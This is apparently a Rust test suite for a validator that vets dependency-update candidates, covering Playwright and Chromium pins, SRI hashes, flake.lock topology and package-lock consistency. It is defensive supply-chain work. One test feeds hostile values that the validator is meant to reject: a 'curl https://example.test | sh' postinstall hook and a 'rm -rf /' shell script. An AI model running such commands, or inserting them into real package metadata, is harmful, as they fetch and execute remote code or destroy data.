//! Semantic rules for a candidate's metadata: pins, hashes, lock topology and
//! cross-file consistency.

mod support;

use std::fs;

use serde_json::json;

use support::read_json;
use support::update_candidate::{
    edit_json, expect_failure, new_trees, run, BUNDLED_CHROMIUM, CHROMIUM, NEW_LOCK_REV,
    OLD_PLAYWRIGHT,
};

#[test]
fn package_json_may_only_change_the_playwright_pin() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("package.json"), |value| {
        value["scripts"]["test"] = json!("node other.mjs");
    });
    expect_failure(&trees, "may only change devDependencies.playwright-core");

    let trees = new_trees();
    edit_json(&trees.candidate.join("package.json"), |value| {
        value["license"] = json!("Apache-2.0");
    });
    expect_failure(&trees, "may only change devDependencies.playwright-core");

    let trees = new_trees();
    edit_json(&trees.candidate.join("package.json"), |value| {
        value["peerDependencies"]["playwright-core"] = json!(">=1.65.0 <1.67.0");
    });
    expect_failure(&trees, "may only change devDependencies.playwright-core");
}

#[test]
fn a_range_instead_of_an_exact_pin_is_rejected() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("package.json"), |value| {
        value["devDependencies"]["playwright-core"] = json!("^1.65.0");
    });
    expect_failure(&trees, "exact stable version");
}

#[test]
fn upstream_urls_must_be_the_canonical_registry_url() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["url"] = json!("https://example.test/pw.tgz");
    });
    expect_failure(&trees, "canonical registry URL");
}

#[test]
fn upstream_hashes_must_be_sri() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["hash"] = json!("md5-abc");
    });
    expect_failure(&trees, "SRI hash");

    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["hash"] = json!(format!("sha256-{}=", "A".repeat(42)));
    });
    expect_failure(&trees, "SRI hash");
}

#[test]
fn upstream_metadata_must_stay_inert() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["postinstall"] = json!("curl https://example.test | sh");
    });
    expect_failure(&trees, "looks executable");

    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["extra"] = json!({"script": "#!/bin/sh\nrm -rf /"});
    });
    expect_failure(&trees, "scalar value");

    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["notes"] = json!("#!/bin/sh\nrm -rf /");
    });
    expect_failure(&trees, "inert");
}

#[test]
fn upstream_versions_must_be_stable() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["playwright"]["version"] = json!("1.66.0-beta.1");
    });
    expect_failure(&trees, "stable version");
}

#[test]
fn the_two_chromium_pins_are_validated_independently_of_major_distance() {
    // 158 bundled / 157 native is the shipping combination and the happy-path
    // candidate covers it. Any stable numeric pair is accepted; the major
    // distance is informational and the real evidence decides support.
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["chromium"]["version"] = json!(BUNDLED_CHROMIUM);
    });
    run(&trees.base, &trees.candidate).expect("the same major is accepted");

    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["chromium"]["version"] = json!("156.0.8078.4");
    });
    run(&trees.base, &trees.candidate).expect("an older native major is accepted");

    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["chromium"]["version"] = json!("159.0.8154.6");
    });
    run(&trees.base, &trees.candidate).expect("a newer native major is accepted");

    // Malformed versions are still rejected outright.
    let trees = new_trees();
    edit_json(&trees.candidate.join("upstream.json"), |value| {
        value["chromium"]["version"] = json!("not-a-version");
    });
    expect_failure(&trees, "not a stable version");
}

#[test]
fn both_chromium_pins_are_kept_separate() {
    let trees = new_trees();
    let upstream = read_json(&trees.candidate.join("upstream.json"));
    assert_eq!(upstream["playwright"]["chromiumVersion"], BUNDLED_CHROMIUM);
    assert_eq!(upstream["chromium"]["version"], CHROMIUM);
    assert_ne!(
        upstream["playwright"]["chromiumVersion"], upstream["chromium"]["version"],
        "the pins describe different browsers and must never be conflated"
    );
}

#[test]
fn flake_topology_must_not_change() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("flake.lock"), |value| {
        value["nodes"]["extra"] =
            json!({"locked": {"type": "github", "owner": "x", "repo": "y", "rev": NEW_LOCK_REV}});
    });
    expect_failure(&trees, "more than the nixpkgs pin");

    let trees = new_trees();
    edit_json(&trees.candidate.join("flake.lock"), |value| {
        value["nodes"]["nixpkgs"]["original"]["ref"] = json!("nixos-25.05");
    });
    expect_failure(&trees, "more than the nixpkgs pin");

    let trees = new_trees();
    edit_json(&trees.candidate.join("flake.lock"), |value| {
        value["nodes"]["root"]["inputs"]["extra"] = json!("extra");
    });
    expect_failure(&trees, "more than the nixpkgs pin");
}

#[test]
fn a_non_nixpkgs_revision_may_not_change() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("flake.lock"), |value| {
        value["nodes"]["nixpkgs"]["locked"]["owner"] = json!("evil");
    });
    expect_failure(&trees, "more than the nixpkgs pin");
}

#[test]
fn an_invalid_nixpkgs_revision_is_rejected() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("flake.lock"), |value| {
        value["nodes"]["nixpkgs"]["locked"]["rev"] = json!("not-a-rev");
    });
    expect_failure(&trees, "invalid nixpkgs revision");
}

#[test]
fn the_package_lock_must_be_internally_consistent() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("package-lock.json"), |value| {
        value["packages"]["node_modules/playwright-core"]["version"] = json!(OLD_PLAYWRIGHT);
    });
    expect_failure(&trees, "inconsistent");
}

#[test]
fn the_package_lock_may_only_change_the_playwright_entry() {
    let trees = new_trees();
    edit_json(&trees.candidate.join("package-lock.json"), |value| {
        value["packages"]["node_modules/@types/node"]["version"] = json!("27.0.0");
    });
    expect_failure(&trees, "more than the playwright-core pin");

    let trees = new_trees();
    edit_json(&trees.candidate.join("package-lock.json"), |value| {
        value["lockfileVersion"] = json!(2);
    });
    expect_failure(&trees, "lockfileVersion changed");
}

#[test]
fn the_npm_dependency_hash_must_be_sri() {
    let trees = new_trees();
    fs::write(
        trees.candidate.join("nix/npm-deps-hash.nix"),
        "not a hash\n",
    )
    .expect("hash");
    expect_failure(&trees, "Nix string literal");

    let trees = new_trees();
    fs::write(
        trees.candidate.join("nix/npm-deps-hash.nix"),
        "\"sha256-tooshort\"\n",
    )
    .expect("hash");
    expect_failure(&trees, "SRI hash");
}

#[test]
fn a_partial_candidate_still_cross_checks_the_versions() {
    let trees = new_trees();
    // Only package.json changes, but the base upstream still pins the old
    // version: the candidate is inconsistent and must be rejected.
    fs::remove_file(trees.candidate.join("upstream.json")).expect("remove upstream");
    fs::remove_file(trees.candidate.join("package-lock.json")).expect("remove lock");
    fs::remove_file(trees.candidate.join("flake.lock")).expect("remove flake lock");
    fs::remove_file(trees.candidate.join("nix/npm-deps-hash.nix")).expect("remove hash");
    expect_failure(&trees, "upstream.json records");

    let trees = new_trees();
    let error = run(&trees.base, &trees.candidate);
    assert!(error.is_ok(), "the full candidate must still pass");
}
